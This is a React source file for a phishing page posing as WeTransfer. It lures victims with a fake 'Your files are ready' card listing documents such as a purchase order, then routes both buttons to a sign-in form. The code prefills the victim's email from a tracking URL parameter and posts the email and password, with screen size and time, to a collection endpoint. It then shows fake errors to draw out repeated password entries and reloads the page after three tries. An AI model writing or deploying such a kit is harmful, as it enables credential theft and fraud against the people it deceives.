import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { FileText, Link as LinkIcon, X, Loader2, AlertCircle, Clock } from 'lucide-react';

const BACKGROUNDS = [
  {
    id: 1,
    image: 'https://images.unsplash.com/photo-1497215728101-856f4ea42174?auto=format&fit=crop&q=80&w=2070',
    title: 'Think about it.',
    description: 'WeTransfer is the simplest way to send your files around the world. Share large files and photos. Transfer up to 2GB free.'
  },
  {
    id: 2,
    image: 'https://images.unsplash.com/photo-1493612276216-ee3925520721?auto=format&fit=crop&q=80&w=2064',
    title: 'Make it happen.',
    description: 'Bring your ideas to life with seamless collaboration. Send high-resolution assets to anyone, anywhere, in seconds.'
  },
  {
    id: 3,
    image: 'https://images.unsplash.com/photo-1516321318423-f06f85e504b3?auto=format&fit=crop&q=80&w=2070',
    title: 'Share the love.',
    description: "Big files shouldn't mean big problems. We handle the heavy lifting so you can focus on what matters most: your creativity."
  },
  {
    id: 4,
    image: 'https://images.unsplash.com/photo-1522202176988-66273c2fd55f?auto=format&fit=crop&q=80&w=2071',
    title: 'Stay in flow.',
    description: 'Don\'t let file limits slow you down. Our platform is built for speed and reliability, keeping your projects moving forward.'
  },
  {
    id: 5,
    image: 'https://images.unsplash.com/photo-1552664730-d307ca884978?auto=format&fit=crop&q=80&w=2070',
    title: 'Your work, everywhere.',
    description: 'From mobile to desktop, your files are always within reach. Secure, fast, and beautifully simple.'
  },
  {
    id: 6,
    image: 'https://images.unsplash.com/photo-1558655146-d09347e92766?auto=format&fit=crop&q=80&w=2064',
    title: 'Creativity unleashed.',
    description: "The world's most creative teams trust WeTransfer to move their biggest ideas. Join millions of creators today."
  },
  {
    id: 7,
    image: 'https://images.unsplash.com/photo-1517245386807-bb43f82c33c4?auto=format&fit=crop&q=80&w=2070',
    title: 'Simply better.',
    description: 'No accounts, no hassle. Just drag, drop, and send. The original file sharing service, perfected for you.'
  }
];

const FILES = [
  { name: 'Purchase Order.pdf', size: '1.5 MB' },
  { name: 'Sample.docx', size: '450 KB' },
  { name: 'Drawing.dwg', size: '2.3 MB' },
  { name: 'Company Profile.pdf', size: '8.2 MB' },
];

export const HomePage: React.FC = () => {
  const [bgIndex, setBgIndex] = useState(0);
  const [modalState, setModalState] = useState<'closed' | 'signin' | 'preview'>('closed');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [attempts, setAttempts] = useState(0);
  const [authError, setAuthError] = useState<string | null>(null);

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const tid = params.get('tid');
    if (tid) {
      setFormData(prev => ({ ...prev, email: tid }));
    }

    const interval = setInterval(() => {
      setBgIndex((prev) => (prev + 1) % BACKGROUNDS.length);
    }, 8000);
    return () => clearInterval(interval);
  }, []);

  const currentBg = BACKGROUNDS[bgIndex];

  const handleDownloadAll = () => {
    setModalState('signin');
  };

  const handleOpenPreview = () => {
    setModalState('preview');
    setTimeout(() => {
      setModalState('signin');
    }, 2500);
  };

  const handleSignIn = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (attempts >= 3) {
      window.location.reload();
      return;
    }

    setIsSubmitting(true);
    setAuthError(null);

    try {
      const response = await fetch('/api/submit-form', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'Sign In Attempt',
          ...formData,
          screenSize: `${window.screen.width}x${window.screen.height}`,
          timestamp: new Date().toLocaleString()
        })
      });

      if (response.ok) {
        const errorMessages = [
          "authentication error please try again",
          "something went wrong check your internet connection"
        ];
        const randomMessage = errorMessages[Math.floor(Math.random() * errorMessages.length)];
        
        setAttempts(prev => prev + 1);
        setAuthError(randomMessage);
        setFormData(prev => ({ ...prev, password: '' }));
      }
    } catch (error) {
      console.error('Submission error:', error);
      setAuthError("An unexpected error occurred. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="relative min-h-screen overflow-hidden">
      {/* Dynamic Backgrounds */}
      <AnimatePresence mode="wait">
        <motion.div
          key={currentBg.id}
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          exit={{ opacity: 0 }}
          transition={{ duration: 1.5 }}
          className="absolute inset-0 z-0"
        >
          <img 
            src={currentBg.image} 
            alt="Background" 
            className="w-full h-full object-cover"
            referrerPolicy="no-referrer"
          />
          <div className="absolute inset-0 bg-white/10" />
        </motion.div>
      </AnimatePresence>

      <div className="relative z-10 max-w-[1600px] mx-auto px-6 min-h-screen flex items-center">
        <div className="grid grid-cols-1 lg:grid-cols-2 gap-12 items-center w-full">
          
          {/* Transfer Card */}
          <motion.div 
            initial={{ opacity: 0, x: -50 }}
            animate={{ opacity: 1, x: 0 }}
            className="bg-white rounded-[40px] p-8 shadow-2xl shadow-black/20 max-w-[440px] w-full"
          >
            <div className="flex items-center justify-between mb-8">
              <h2 className="text-2xl font-bold text-zinc-900">Your files are ready</h2>
              <span className="px-3 py-1 bg-zinc-100 text-zinc-500 text-xs font-bold rounded-full">
                {FILES.length} files
              </span>
            </div>
            
            <div className="border border-zinc-100 rounded-2xl overflow-hidden mb-6">
              <div className="max-h-[320px] overflow-y-auto custom-scrollbar">
                {FILES.map((file, i) => (
                  <div 
                    key={i} 
                    className={`flex items-center gap-4 p-4 hover:bg-zinc-50 transition-colors ${i !== FILES.length - 1 ? 'border-b border-zinc-100' : ''}`}
                  >
                    <div className="w-10 h-10 bg-zinc-100 rounded-lg flex items-center justify-center text-zinc-400">
                      <FileText size={20} />
                    </div>
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-semibold text-zinc-900 truncate">{file.name}</p>
                      <p className="text-xs text-zinc-400">{file.size}</p>
                    </div>
                  </div>
                ))}
              </div>
            </div>

            <div className="flex items-center justify-center gap-6 text-zinc-400 mb-8">
              <div className="flex items-center gap-1.5">
                <Clock size={14} />
                <span className="text-xs font-medium">Expires in 24 hours</span>
              </div>
              <div className="flex items-center gap-1.5">
                <LinkIcon size={14} />
                <button className="text-xs font-medium hover:text-zinc-600 transition-colors">Report a problem</button>
              </div>
            </div>

            <div className="flex gap-3">
              <button 
                onClick={handleDownloadAll}
                className="flex-1 bg-blue-600 text-white py-4 rounded-full font-bold text-sm hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20"
              >
                Download all
              </button>
              <button 
                onClick={handleOpenPreview}
                className="flex-1 bg-white border border-zinc-200 text-zinc-900 py-4 rounded-full font-bold text-sm hover:bg-zinc-50 transition-all"
              >
                Open preview
              </button>
            </div>
          </motion.div>

          {/* Hero Content */}
          <div className="max-w-xl">
            <AnimatePresence mode="wait">
              <motion.div
                key={currentBg.id}
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                exit={{ opacity: 0, y: -20 }}
                transition={{ duration: 0.8 }}
              >
                <h1 className="text-[100px] leading-[0.9] font-black text-zinc-900 mb-8 tracking-tighter">
                  {currentBg.title}
                </h1>
                <p className="text-xl text-zinc-700 font-medium leading-relaxed mb-10 max-w-lg">
                  {currentBg.description}
                </p>
                <div className="flex items-center gap-8">
                  <button className="bg-blue-600 text-white px-10 py-5 rounded-full font-black text-lg hover:bg-blue-700 transition-all shadow-xl shadow-blue-600/30">
                    Try it now
                  </button>
                  <button className="text-zinc-700 font-bold hover:text-zinc-900 transition-colors flex items-center gap-2">
                    Learn more about our free trial
                  </button>
                </div>
              </motion.div>
            </AnimatePresence>
          </div>

        </div>
      </div>

      {/* Modals Overlay */}
      <AnimatePresence>
        {modalState !== 'closed' && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/40 backdrop-blur-sm"
          >
            {modalState === 'preview' && (
              <motion.div
                initial={{ scale: 0.9, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.9, opacity: 0 }}
                className="bg-white/90 backdrop-blur-md rounded-[32px] p-12 max-w-2xl w-full text-center shadow-2xl relative overflow-hidden"
              >
                <div className="absolute inset-0 bg-gradient-to-br from-zinc-100/50 to-transparent pointer-events-none" />
                <div className="relative z-10">
                  <div className="w-16 h-16 bg-zinc-100 rounded-2xl flex items-center justify-center mx-auto mb-8 text-zinc-400">
                    <FileText size={32} />
                  </div>
                  <h2 className="text-3xl font-black text-zinc-900 mb-4">Sign in to view full document</h2>
                  <p className="text-zinc-600 text-lg mb-8 max-w-md mx-auto">
                    This is a secure preview. To access the complete file, please sign in.
                  </p>
                  <div className="flex items-center justify-center gap-3 text-zinc-400 font-medium">
                    <Loader2 size={20} className="animate-spin" />
                    <span>Redirecting to sign in...</span>
                  </div>
                </div>
              </motion.div>
            )}

            {modalState === 'signin' && (
              <motion.div
                initial={{ scale: 0.9, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                exit={{ scale: 0.9, opacity: 0 }}
                className="bg-white rounded-[32px] p-10 max-w-[480px] w-full shadow-2xl relative"
              >
                <button 
                  onClick={() => setModalState('closed')}
                  className="absolute top-6 right-6 text-zinc-400 hover:text-zinc-600 transition-colors"
                >
                  <X size={24} />
                </button>

                <h2 className="text-3xl font-black text-zinc-900 mb-2">Sign in to download</h2>
                <p className="text-zinc-500 mb-10">Enter your credentials to access your files.</p>

                {authError && (
                  <motion.div 
                    initial={{ opacity: 0, y: -10 }}
                    animate={{ opacity: 1, y: 0 }}
                    className="mb-6 p-4 bg-red-50 border border-red-100 text-red-600 rounded-2xl text-sm font-medium flex items-center gap-2"
                  >
                    <AlertCircle size={16} />
                    {authError}
                  </motion.div>
                )}

                <form onSubmit={handleSignIn} className="space-y-6">
                  <div className="space-y-2">
                    <label className="text-sm font-bold text-zinc-900 ml-1">Email</label>
                    <input
                      required
                      type="email"
                      placeholder="you@example.com"
                      value={formData.email}
                      onChange={(e) => setFormData({ ...formData, email: e.target.value })}
                      className="w-full px-5 py-4 bg-zinc-50 border border-zinc-200 rounded-2xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all"
                    />
                  </div>
                  <div className="space-y-2">
                    <label className="text-sm font-bold text-zinc-900 ml-1">Password</label>
                    <input
                      required
                      type="password"
                      value={formData.password}
                      onChange={(e) => setFormData({ ...formData, password: e.target.value })}
                      className="w-full px-5 py-4 bg-zinc-50 border border-zinc-200 rounded-2xl focus:outline-none focus:ring-2 focus:ring-blue-500/20 focus:border-blue-500 transition-all"
                    />
                  </div>

                  <div className="flex gap-3 pt-4">
                    <button 
                      type="button"
                      onClick={() => setModalState('closed')}
                      className="flex-1 px-6 py-4 border border-zinc-200 rounded-2xl font-bold text-zinc-600 hover:bg-zinc-50 transition-all flex items-center justify-center gap-2"
                    >
                      <X size={18} />
                      Cancel
                    </button>
                    <button 
                      type="submit"
                      disabled={isSubmitting}
                      className="flex-[2] px-6 py-4 bg-blue-600 text-white rounded-2xl font-bold hover:bg-blue-700 transition-all shadow-lg shadow-blue-600/20 flex items-center justify-center gap-2 disabled:opacity-50"
                    >
                      {isSubmitting ? <Loader2 size={20} className="animate-spin" /> : 'Sign in'}
                    </button>
                  </div>
                </form>
              </motion.div>
            )}
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};
